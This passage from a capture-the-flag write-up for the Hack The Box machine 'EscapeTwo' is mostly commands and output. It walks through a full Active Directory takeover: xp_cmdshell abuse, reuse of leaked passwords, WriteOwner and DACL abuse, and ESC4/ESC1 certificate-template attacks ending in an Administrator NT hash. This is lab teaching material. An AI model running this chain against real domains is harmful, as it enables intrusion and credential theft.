+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ impacket-mssqlclient sequel.htb/sa:&#x27;MSSQLP@ssw0rd!&#x27;@10.10.11.51</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] Encryption required, switching to TLS</span><br><span class="line">[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master</span><br><span class="line">[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english</span><br><span class="line">[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192</span><br><span class="line">[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to &#x27;master&#x27;.</span><br><span class="line">[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.</span><br><span class="line">[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)</span><br><span class="line">[!] Press help for extra shell commands</span><br><span class="line">SQL (sa  dbo@master)&gt;</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>using the command from <a class="link"   target="_blank" rel="noopener" href="https://github.com/noraj/the-hacking-trove/blob/master/docs/Cheat%20Sheets/mssql.md" >https://github.com/noraj/the-hacking-trove/blob/master/docs/Cheat%20Sheets/mssql.md<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>, activate xp_cmdshell for further enumeration</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">SQL (sa  dbo@master)&gt; EXEC master..xp_cmdshell &#x27;net user&#x27;;</span><br><span class="line">output</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">NULL</span><br><span class="line"></span><br><span class="line">User accounts for \\DC01</span><br><span class="line"></span><br><span class="line">NULL</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Administrator            ca_svc                   Guest</span><br><span class="line"></span><br><span class="line">krbtgt                   michael                  oscar</span><br><span class="line"></span><br><span class="line">rose                     ryan                     sql_svc</span><br><span class="line"></span><br><span class="line">The command completed successfully.</span><br><span class="line"></span><br><span class="line">NULL</span><br><span class="line"></span><br><span class="line">NULL</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>after some enumeration, got this configuration file</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">SQL (sa  dbo@master)&gt; EXEC master..xp_cmdshell &#x27;type C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI&#x27;;</span><br><span class="line">output</span><br><span class="line">-------------------------------------------------</span><br><span class="line">[OPTIONS]</span><br><span class="line"></span><br><span class="line">ACTION=&quot;Install&quot;</span><br><span class="line"></span><br><span class="line">QUIET=&quot;True&quot;</span><br><span class="line"></span><br><span class="line">FEATURES=SQL</span><br><span class="line"></span><br><span class="line">INSTANCENAME=&quot;SQLEXPRESS&quot;</span><br><span class="line"></span><br><span class="line">INSTANCEID=&quot;SQLEXPRESS&quot;</span><br><span class="line"></span><br><span class="line">RSSVCACCOUNT=&quot;NT Service\ReportServer$SQLEXPRESS&quot;</span><br><span class="line"></span><br><span class="line">AGTSVCACCOUNT=&quot;NT AUTHORITY\NETWORK SERVICE&quot;</span><br><span class="line"></span><br><span class="line">AGTSVCSTARTUPTYPE=&quot;Manual&quot;</span><br><span class="line"></span><br><span class="line">COMMFABRICPORT=&quot;0&quot;</span><br><span class="line"></span><br><span class="line">COMMFABRICNETWORKLEVEL=&quot;&quot;0&quot;</span><br><span class="line"></span><br><span class="line">COMMFABRICENCRYPTION=&quot;0&quot;</span><br><span class="line"></span><br><span class="line">MATRIXCMBRICKCOMMPORT=&quot;0&quot;</span><br><span class="line"></span><br><span class="line">SQLSVCSTARTUPTYPE=&quot;Automatic&quot;</span><br><span class="line"></span><br><span class="line">FILESTREAMLEVEL=&quot;0&quot;</span><br><span class="line"></span><br><span class="line">ENABLERANU=&quot;False&quot;</span><br><span class="line"></span><br><span class="line">SQLCOLLATION=&quot;SQL_Latin1_General_CP1_CI_AS&quot;</span><br><span class="line"></span><br><span class="line">SQLSVCACCOUNT=&quot;SEQUEL\sql_svc&quot;</span><br><span class="line"></span><br><span class="line">SQLSVCPASSWORD=&quot;WqSZAF6CysDQbGb3&quot;</span><br><span class="line"></span><br><span class="line">SQLSYSADMINACCOUNTS=&quot;SEQUEL\Administrator&quot;</span><br><span class="line"></span><br><span class="line">SECURITYMODE=&quot;SQL&quot;</span><br><span class="line"></span><br><span class="line">SAPWD=&quot;MSSQLP@ssw0rd!&quot;</span><br><span class="line"></span><br><span class="line">ADDCURRENTUSERASSQLADMIN=&quot;False&quot;</span><br><span class="line"></span><br><span class="line">TCPENABLED=&quot;1&quot;</span><br><span class="line"></span><br><span class="line">NPENABLED=&quot;1&quot;</span><br><span class="line"></span><br><span class="line">BROWSERSVCSTARTUPTYPE=&quot;Automatic&quot;</span><br><span class="line"></span><br><span class="line">IAcceptSQLServerLicenseTerms=True</span><br><span class="line"></span><br><span class="line">NULL</span><br></pre></td></tr></table></figure></div></li>
+</ol>
+<p>interesting finding:</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">SQL (sa  dbo@master)&gt; EXEC master..xp_cmdshell &#x27;dir C:\Users&#x27;;</span><br><span class="line">output</span><br><span class="line">----------------------------------------------------</span><br><span class="line"> Volume in drive C has no label.</span><br><span class="line"></span><br><span class="line"> Volume Serial Number is 3705-289D</span><br><span class="line"></span><br><span class="line">NULL</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users</span><br><span class="line"></span><br><span class="line">NULL</span><br><span class="line"></span><br><span class="line">06/09/2024  05:42 AM    &lt;DIR&gt;          .</span><br><span class="line"></span><br><span class="line">06/09/2024  05:42 AM    &lt;DIR&gt;          ..</span><br><span class="line"></span><br><span class="line">12/25/2024  03:10 AM    &lt;DIR&gt;          Administrator</span><br><span class="line"></span><br><span class="line">06/09/2024  03:11 AM    &lt;DIR&gt;          Public</span><br><span class="line"></span><br><span class="line">06/09/2024  03:15 AM    &lt;DIR&gt;          ryan</span><br><span class="line"></span><br><span class="line">06/08/2024  03:16 PM    &lt;DIR&gt;          sql_svc</span><br><span class="line"></span><br><span class="line">               0 File(s)              0 bytes</span><br><span class="line"></span><br><span class="line">               6 Dir(s)   3,666,432,000 bytes free</span><br><span class="line"></span><br><span class="line">NULL</span><br></pre></td></tr></table></figure></div>
+<p><strong>we can deduct that possibly ryan who has administrator privileges created a service named sql_svc, so its possible for the password to be reuse. What this means is that the password in sql-Configuration.INI might be password for ryan as well</strong></p>
+<ol start="9">
+<li>with that, evil-winrm into ryan with the password from sql-Configuration.INI<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ evil-winrm -i 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3</span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line"></span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine</span><br><span class="line"></span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\Documents&gt; cd ../Desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\Desktop&gt; ls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\ryan\Desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-ar---        1/12/2025   5:51 AM             34 user.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure></div></li>
+</ol>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/htb-escapetwo/Pasted image 20250112222433.png"
+                      width="500"
+                >
+
+
+
+<ol start="10">
+<li><p>Until here, we can advance to bloodhound and notice user Ryan have ‘WriteOwner’ towards CA_SVC</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/htb-escapetwo/Pasted image 20250112223826.png"
+                      width="500"
+                >
+
+
+</li>
+<li><p>to exploit ‘WriteOwner’, refer to the Linux Abuse by the bloodhound modify the command.</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// tune the clock skew to match with the server</span><br><span class="line">ntpdate 10.10.11.51</span><br><span class="line"></span><br><span class="line">// change the owner of CA_SVC to Ryan</span><br><span class="line">impacket-owneredit -action write -new-owner &#x27;ryan&#x27; -target &#x27;ca_svc&#x27; &#x27;sequel.htb&#x27;/&#x27;ryan&#x27;:&#x27;WqSZAF6CysDQbGb3&#x27;</span><br><span class="line"></span><br><span class="line">// grant FullControl to Ryan over CA_SVC</span><br><span class="line">impacket-dacledit -action &#x27;write&#x27; -rights &#x27;FullControl&#x27; -principal &#x27;ryan&#x27; -target &#x27;ca_svc&#x27; &#x27;sequel.htb&#x27;/&#x27;ryan&#x27;:&#x27;WqSZAF6CysDQbGb3&#x27;</span><br><span class="line"></span><br><span class="line">// change the password of CA_SVC by abusing the rights granted in the previous command</span><br><span class="line">net rpc password &quot;ca_svc&quot; &quot;newPassword@2025&quot; -U &quot;sequel.htb&quot;/&quot;ryan&quot;%&quot;WqSZAF6CysDQbGb3&quot; -S &quot;DC01.sequel.htb&quot;</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>after gaining full control over CA_SVC, we can perform certificate check via certipy to verify the vulnerability in the templates</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">$ certipy-ad find -u &#x27;ca_svc&#x27; -p &#x27;newPassword@2025&#x27; -dc-ip 10.10.11.51 -vulnerable -enabled -stdout</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Finding certificate templates</span><br><span class="line">[*] Found 34 certificate templates</span><br><span class="line">[*] Finding certificate authorities</span><br><span class="line">[*] Found 1 certificate authority</span><br><span class="line">[*] Found 12 enabled certificate templates</span><br><span class="line">[*] Trying to get CA configuration for &#x27;sequel-DC01-CA&#x27; via CSRA</span><br><span class="line">[!] Got error while trying to get CA configuration for &#x27;sequel-DC01-CA&#x27; via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.</span><br><span class="line">[*] Trying to get CA configuration for &#x27;sequel-DC01-CA&#x27; via RRP</span><br><span class="line">[*] Got CA configuration for &#x27;sequel-DC01-CA&#x27;</span><br><span class="line">[*] Enumeration output:</span><br><span class="line">Certificate Authorities</span><br><span class="line">  0</span><br><span class="line">    CA Name                             : sequel-DC01-CA</span><br><span class="line">    DNS Name                            : DC01.sequel.htb</span><br><span class="line">    Certificate Subject                 : CN=sequel-DC01-CA, DC=sequel, DC=htb</span><br><span class="line">    Certificate Serial Number           : 152DBD2D8E9C079742C0F3BFF2A211D3</span><br><span class="line">    Certificate Validity Start          : 2024-06-08 16:50:40+00:00</span><br><span class="line">    Certificate Validity End            : 2124-06-08 17:00:40+00:00</span><br><span class="line">    Web Enrollment                      : Disabled</span><br><span class="line">    User Specified SAN                  : Disabled</span><br><span class="line">    Request Disposition                 : Issue</span><br><span class="line">    Enforce Encryption for Requests     : Enabled</span><br><span class="line">    Permissions</span><br><span class="line">      Owner                             : SEQUEL.HTB\Administrators</span><br><span class="line">      Access Rights</span><br><span class="line">        ManageCertificates              : SEQUEL.HTB\Administrators</span><br><span class="line">                                          SEQUEL.HTB\Domain Admins</span><br><span class="line">                                          SEQUEL.HTB\Enterprise Admins</span><br><span class="line">        ManageCa                        : SEQUEL.HTB\Administrators</span><br><span class="line">                                          SEQUEL.HTB\Domain Admins</span><br><span class="line">                                          SEQUEL.HTB\Enterprise Admins</span><br><span class="line">        Enroll                          : SEQUEL.HTB\Authenticated Users</span><br><span class="line">Certificate Templates</span><br><span class="line">  0</span><br><span class="line">    Template Name                       : DunderMifflinAuthentication</span><br><span class="line">    Display Name                        : Dunder Mifflin Authentication</span><br><span class="line">    Certificate Authorities             : sequel-DC01-CA</span><br><span class="line">    Enabled                             : True</span><br><span class="line">    Client Authentication               : True</span><br><span class="line">    Enrollment Agent                    : False</span><br><span class="line">    Any Purpose                         : False</span><br><span class="line">    Enrollee Supplies Subject           : False</span><br><span class="line">    Certificate Name Flag               : SubjectRequireCommonName</span><br><span class="line">                                          SubjectAltRequireDns</span><br><span class="line">    Enrollment Flag                     : AutoEnrollment</span><br><span class="line">                                          PublishToDs</span><br><span class="line">    Private Key Flag                    : 16842752</span><br><span class="line">    Extended Key Usage                  : Client Authentication</span><br><span class="line">                                          Server Authentication</span><br><span class="line">    Requires Manager Approval           : False</span><br><span class="line">    Requires Key Archival               : False</span><br><span class="line">    Authorized Signatures Required      : 0</span><br><span class="line">    Validity Period                     : 1000 years</span><br><span class="line">    Renewal Period                      : 6 weeks</span><br><span class="line">    Minimum RSA Key Length              : 2048</span><br><span class="line">    Permissions</span><br><span class="line">      Enrollment Permissions</span><br><span class="line">        Enrollment Rights               : SEQUEL.HTB\Domain Admins</span><br><span class="line">                                          SEQUEL.HTB\Enterprise Admins</span><br><span class="line">      Object Control Permissions</span><br><span class="line">        Owner                           : SEQUEL.HTB\Enterprise Admins</span><br><span class="line">        Full Control Principals         : SEQUEL.HTB\Cert Publishers</span><br><span class="line">        Write Owner Principals          : SEQUEL.HTB\Domain Admins</span><br><span class="line">                                          SEQUEL.HTB\Enterprise Admins</span><br><span class="line">                                          SEQUEL.HTB\Administrator</span><br><span class="line">                                          SEQUEL.HTB\Cert Publishers</span><br><span class="line">        Write Dacl Principals           : SEQUEL.HTB\Domain Admins</span><br><span class="line">                                          SEQUEL.HTB\Enterprise Admins</span><br><span class="line">                                          SEQUEL.HTB\Administrator</span><br><span class="line">                                          SEQUEL.HTB\Cert Publishers</span><br><span class="line">        Write Property Principals       : SEQUEL.HTB\Domain Admins</span><br><span class="line">                                          SEQUEL.HTB\Enterprise Admins</span><br><span class="line">                                          SEQUEL.HTB\Administrator</span><br><span class="line">                                          SEQUEL.HTB\Cert Publishers</span><br><span class="line">    [!] Vulnerabilities</span><br><span class="line">      ESC4                              : &#x27;SEQUEL.HTB\\Cert Publishers&#x27; has dangerous permissions</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>notice ESC4 exist, refer to a website <a class="link"   target="_blank" rel="noopener" href="https://redfoxsec.com/blog/exploiting-weak-acls-on-active-directory-certificate-templates-esc4/" >https://redfoxsec.com/blog/exploiting-weak-acls-on-active-directory-certificate-templates-esc4/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// backup the template and update the current template to allow more vulnerabilities</span><br><span class="line">certipy-ad template -dc-ip 10.10.11.51 -u ca_svc -p &#x27;newPassword@2025&#x27; -template DunderMifflinAuthentication -target DC01.sequel.htb -save-old</span><br></pre></td></tr></table></figure></div></li>
+</ol>
+<p>to verify the updated template consists of ESC1 to 4</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">$ certipy-ad template -dc-ip 10.10.11.51 -u ca_svc -p &#x27;newPassword@2025&#x27; -template DunderMifflinAuthentication -target DC01.sequel.htb -save-old &amp;&amp; certipy-ad find -u &#x27;ca_svc&#x27; -p &#x27;newPassword@2025&#x27; -dc-ip 10.10.11.51 -vulnerable -enabled -stdout</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Saved old configuration for &#x27;DunderMifflinAuthentication&#x27; to &#x27;DunderMifflinAuthentication.json&#x27;</span><br><span class="line">[*] Updating certificate template &#x27;DunderMifflinAuthentication&#x27;</span><br><span class="line">[*] Successfully updated &#x27;DunderMifflinAuthentication&#x27;</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Finding certificate templates</span><br><span class="line">[*] Found 34 certificate templates</span><br><span class="line">[*] Finding certificate authorities</span><br><span class="line">[*] Found 1 certificate authority</span><br><span class="line">[*] Found 12 enabled certificate templates</span><br><span class="line">[*] Trying to get CA configuration for &#x27;sequel-DC01-CA&#x27; via CSRA</span><br><span class="line">[!] Got error while trying to get CA configuration for &#x27;sequel-DC01-CA&#x27; via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.</span><br><span class="line">[*] Trying to get CA configuration for &#x27;sequel-DC01-CA&#x27; via RRP</span><br><span class="line">[*] Got CA configuration for &#x27;sequel-DC01-CA&#x27;</span><br><span class="line">[*] Enumeration output:</span><br><span class="line">Certificate Authorities</span><br><span class="line">  0</span><br><span class="line">    CA Name                             : sequel-DC01-CA</span><br><span class="line">    DNS Name                            : DC01.sequel.htb</span><br><span class="line">    Certificate Subject                 : CN=sequel-DC01-CA, DC=sequel, DC=htb</span><br><span class="line">    Certificate Serial Number           : 152DBD2D8E9C079742C0F3BFF2A211D3</span><br><span class="line">    Certificate Validity Start          : 2024-06-08 16:50:40+00:00</span><br><span class="line">    Certificate Validity End            : 2124-06-08 17:00:40+00:00</span><br><span class="line">    Web Enrollment                      : Disabled</span><br><span class="line">    User Specified SAN                  : Disabled</span><br><span class="line">    Request Disposition                 : Issue</span><br><span class="line">    Enforce Encryption for Requests     : Enabled</span><br><span class="line">    Permissions</span><br><span class="line">      Owner                             : SEQUEL.HTB\Administrators</span><br><span class="line">      Access Rights</span><br><span class="line">        ManageCertificates              : SEQUEL.HTB\Administrators</span><br><span class="line">                                          SEQUEL.HTB\Domain Admins</span><br><span class="line">                                          SEQUEL.HTB\Enterprise Admins</span><br><span class="line">        ManageCa                        : SEQUEL.HTB\Administrators</span><br><span class="line">                                          SEQUEL.HTB\Domain Admins</span><br><span class="line">                                          SEQUEL.HTB\Enterprise Admins</span><br><span class="line">        Enroll                          : SEQUEL.HTB\Authenticated Users</span><br><span class="line">Certificate Templates</span><br><span class="line">  0</span><br><span class="line">    Template Name                       : DunderMifflinAuthentication</span><br><span class="line">    Display Name                        : Dunder Mifflin Authentication</span><br><span class="line">    Certificate Authorities             : sequel-DC01-CA</span><br><span class="line">    Enabled                             : True</span><br><span class="line">    Client Authentication               : True</span><br><span class="line">    Enrollment Agent                    : True</span><br><span class="line">    Any Purpose                         : True</span><br><span class="line">    Enrollee Supplies Subject           : True</span><br><span class="line">    Certificate Name Flag               : EnrolleeSuppliesSubject</span><br><span class="line">    Enrollment Flag                     : None</span><br><span class="line">    Private Key Flag                    : ExportableKey</span><br><span class="line">    Requires Manager Approval           : False</span><br><span class="line">    Requires Key Archival               : False</span><br><span class="line">    Authorized Signatures Required      : 0</span><br><span class="line">    Validity Period                     : 5 years</span><br><span class="line">    Renewal Period                      : 6 weeks</span><br><span class="line">    Minimum RSA Key Length              : 2048</span><br><span class="line">    Permissions</span><br><span class="line">      Object Control Permissions</span><br><span class="line">        Owner                           : SEQUEL.HTB\Enterprise Admins</span><br><span class="line">        Full Control Principals         : SEQUEL.HTB\Authenticated Users</span><br><span class="line">        Write Owner Principals          : SEQUEL.HTB\Authenticated Users</span><br><span class="line">        Write Dacl Principals           : SEQUEL.HTB\Authenticated Users</span><br><span class="line">        Write Property Principals       : SEQUEL.HTB\Authenticated Users</span><br><span class="line">    [!] Vulnerabilities</span><br><span class="line">      ESC1                              : &#x27;SEQUEL.HTB\\Authenticated Users&#x27; can enroll, enrollee supplies subject and template allows client authentication</span><br><span class="line">      ESC2                              : &#x27;SEQUEL.HTB\\Authenticated Users&#x27; can enroll and template can be used for any purpose</span><br><span class="line">      ESC3                              : &#x27;SEQUEL.HTB\\Authenticated Users&#x27; can enroll and template has Certificate Request Agent EKU set</span><br><span class="line">      ESC4                              : &#x27;SEQUEL.HTB\\Authenticated Users&#x27; has dangerous permissions</span><br></pre></td></tr></table></figure></div>
+
+<ol start="14">
+<li><p>then, exploit it via method of exploiting ESC1</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ certipy-ad req -u &#x27;ca_svc&#x27; -p &#x27;newPassword@2025&#x27; -ca &#x27;sequel-DC01-CA&#x27; -template &#x27;DunderMifflinAuthentication&#x27; -upn &#x27;Administrator@sequel.htb&#x27; -dc-ip 10.10.11.51</span><br><span class="line"></span><br><span class="line">[*] Requesting certificate via RPC</span><br><span class="line">[*] Successfully requested certificate</span><br><span class="line">[*] Request ID is 16</span><br><span class="line">[*] Got certificate with UPN &#x27;Administrator@sequel.htb&#x27;</span><br><span class="line">[*] Certificate has no object SID</span><br><span class="line">[*] Saved certificate and private key to &#x27;administrator.pfx&#x27; </span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>using certipy, authenticate using the certificate [administrator.pfx] and get the TGT Ticket and NTLM hash</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.51</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Using principal: administrator@sequel.htb</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saved credential cache to &#x27;administrator.ccache&#x27;</span><br><span class="line">[*] Trying to retrieve NT hash for &#x27;administrator&#x27;</span><br><span class="line">[*] Got hash for &#x27;administrator@sequel.htb&#x27;: aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>after that, log in to administrator via impacket-psexec and pwn</p>
